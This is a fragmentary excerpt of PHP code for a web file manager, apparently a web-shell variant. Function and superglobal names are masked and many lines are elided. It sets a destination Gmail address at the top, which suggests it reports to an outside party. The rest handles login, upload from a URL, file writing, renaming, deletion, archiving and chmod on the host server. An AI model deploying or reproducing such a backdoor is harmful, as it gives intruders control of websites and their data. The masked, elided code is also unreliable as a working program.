...
$tujuan = 'seo.newbie666@gmail.com';
...
if (empty(XXXXXXXXX['token'])) {

if (function_exists('random_bytes')) {

XXXXXXXXX['token'] = bin2hex(random_bytes(32));

} else {

	XXXXXXXXX['token'] = bin2hex(openssl_random_pseudo_bytes(32));
...
if (isset(XXXXXXXXX[FM_SESSION_ID]['logged']) && !empty($directories_users[XXXXXXXXX[FM_SESSION_ID]['logged']])) {

$wd = fm_clean_path(dirname($_SERVER['PHP_SELF']));

$root_url =$root_url.$wd.DIRECTORY_SEPARATOR.$directories_users[XXXXXXXXX[FM_SESSION_ID]['logged']];
...
if (isset(XXXXX['logout'])) {

unset(XXXXXXXXX[FM_SESSION_ID]['logged']);

unset( XXXXXXXXX['token']); 
...
if (isset(XXXXXXXXX[FM_SESSION_ID]['logged'], $auth_users[XXXXXXXXX[FM_SESSION_ID]['logged']])) {



} elseif (isset(XXXXXX['fm_usr'], XXXXXX['fm_pwd'], XXXXXX['token'])) {
...
if (isset($auth_users[XXXXXX['fm_usr']]) && isset(XXXXXX['fm_pwd']) && password_verify(XXXXXX['fm_pwd'], $auth_users[XXXXXX['fm_usr']]) && verifyToken(XXXXXX['token'])) {

XXXXXXXXX[FM_SESSION_ID]['logged'] = XXXXXX['fm_usr'];
...
<input type="hidden" name="token" value="<?php echo htmlentities(XXXXXXXXX['token']); ?>" />
...
if ($use_auth && isset(XXXXXXXXX[FM_SESSION_ID]['logged'])) {

$root_path = isset($directories_users[XXXXXXXXX[FM_SESSION_ID]['logged']]) ? $directories_users[XXXXXXXXX[FM_SESSION_ID]['logged']] : $root_path;
...
define('FM_READONLY', $global_readonly || ($use_auth && !empty($readonly_users) && isset(XXXXXXXXX[FM_SESSION_ID]['logged']) && in_array(XXXXXXXXX[FM_SESSION_ID]['logged'], $readonly_users)));

define('FM_IS_WIN', DIRECTORY_SEPARATOR == '\\');

if (!isset(XXXXX['p']) && empty($_FILES)) {

fm_redirect(FM_SELF_URL . '?p=');

}

$p = isset(XXXXX['p']) ? XXXXX['p'] : (isset(XXXXXX['p']) ? XXXXXX['p'] : '');

$p = fm_clean_path($p);

$input = file_get_contents('php://input');

XXXXXX = (strpos($input, 'ajax') != FALSE && strpos($input, 'save') != FALSE) ? json_decode($input, true) : XXXXXX;
...
if ((isset(XXXXXXXXX[FM_SESSION_ID]['logged'], $auth_users[XXXXXXXXX[FM_SESSION_ID]['logged']]) || !FM_USE_AUTH) && isset(XXXXXX['ajax'], XXXXXX['token']) && !FM_READONLY) {

if(!verifyToken(XXXXXX['token'])) {
...
if(isset(XXXXXX['type']) && XXXXXX['type']=="search") {

$dir = XXXXXX['path'] == "." ? '': XXXXXX['path'];

$response = scan(fm_clean_path($dir), XXXXXX['content']);
...
if (isset(XXXXXX['type']) && XXXXXX['type'] == "save") {
...
$writedata = XXXXXX['content'];

$fd = XXXXX($file_path, "w");

$write_results = @XXXXXX($fd, $writedata);
...
if (isset(XXXXXX['type']) && XXXXXX['type'] == "backup" && !empty(XXXXXX['file'])) {

$fileName = fm_clean_path(XXXXXX['file']);

$fullPath = FM_ROOT_PATH . '/';

if (!empty(XXXXXX['path'])) {

$relativeDirPath = fm_clean_path(XXXXXX['path']);
...
if (isset(XXXXXX['type']) && XXXXXX['type'] == "settings") {

global $cfg, $lang, $report_errors, $show_hidden_files, $lang_list, $hide_Cols, $theme;

$newLng = XXXXXX['js-language'];
...
$erp = isset(XXXXXX['js-error-report']) && XXXXXX['js-error-report'] == "true" ? true : false;

$shf = isset(XXXXXX['js-show-hidden']) && XXXXXX['js-show-hidden'] == "true" ? true : false;

$hco = isset(XXXXXX['js-hide-cols']) && XXXXXX['js-hide-cols'] == "true" ? true : false;

$te3 = XXXXXX['js-theme-3'];
...
if (isset(XXXXXX['type']) && XXXXXX['type'] == "pwdhash") {

$res = isset(XXXXXX['inputPassword2']) && !empty(XXXXXX['inputPassword2']) ? password_hash(XXXXXX['inputPassword2'], PASSWORD_DEFAULT) : '';
...
if(isset(XXXXXX['type']) && XXXXXX['type'] == "upload" && !empty($_REQUEST["uploadurl"])) {
...
if (isset(XXXXX['del'], XXXXXX['token']) && !FM_READONLY) {

$del = str_replace( '/', '', fm_clean_path( XXXXX['del'] ) );

if ($del != '' && $del != '..' && $del != '.' && verifyToken(XXXXXX['token'])) {
...
if (isset(XXXXXX['newfilename'], XXXXXX['newfile'], XXXXXX['token']) && !FM_READONLY) {

$type = urldecode(XXXXXX['newfile']);

$new = str_replace( '/', '', fm_clean_path( strip_tags( XXXXXX['newfilename'] ) ) );

if (fm_isvalid_filename($new) && $new != '' && $new != '..' && $new != '.' && verifyToken(XXXXXX['token'])) {
...
@XXXXX($path . '/' . $new, 'w') or die('Cannot open file:' . $new);
...
if (isset(XXXXX['copy'], XXXXX['finish']) && !FM_READONLY) {



$copy = urldecode(XXXXX['copy']);
...
if (isset(XXXXXX['file'], XXXXXX['copy_to'], XXXXXX['finish'], XXXXXX['token']) && !FM_READONLY) {
...
$copy_to = fm_clean_path(XXXXXX['copy_to']);
...
if (isset(XXXXXX['rename_from'], XXXXXX['rename_to'], XXXXXX['token']) && !FM_READONLY) {
...
$old = urldecode(XXXXXX['rename_from']);
...
$new = urldecode(XXXXXX['rename_to']);
...
if (isset(XXXXX['dl'], XXXXXX['token'])) {
...
$chunkIndex = XXXXXX['dzchunkindex'];

$chunkTotal = XXXXXX['dztotalchunkcount'];
...
$out = @XXXXX("{$fullPath}.part", $chunkIndex == 0 ? "wb" : "ab");

if ($out) {

$in = @XXXXX($tmp_name, "rb");
...
} else if (XXXXXXXXXXXXXXXXXX($tmp_name, $fullPath)) {
...
if (isset(XXXXXX['group'], XXXXXX['delete'], XXXXXX['token']) && !FM_READONLY) {
...
if (isset(XXXXXX['group'], XXXXXX['token']) && (isset(XXXXXX['zip']) || isset(XXXXXX['tar'])) && !FM_READONLY) {
...
if (isset(XXXXXX['unzip'], XXXXXX['token']) && !FM_READONLY) {
...
if (isset(XXXXXX['chmod'], XXXXXX['token']) && !FM_READONLY && !FM_IS_WIN) {
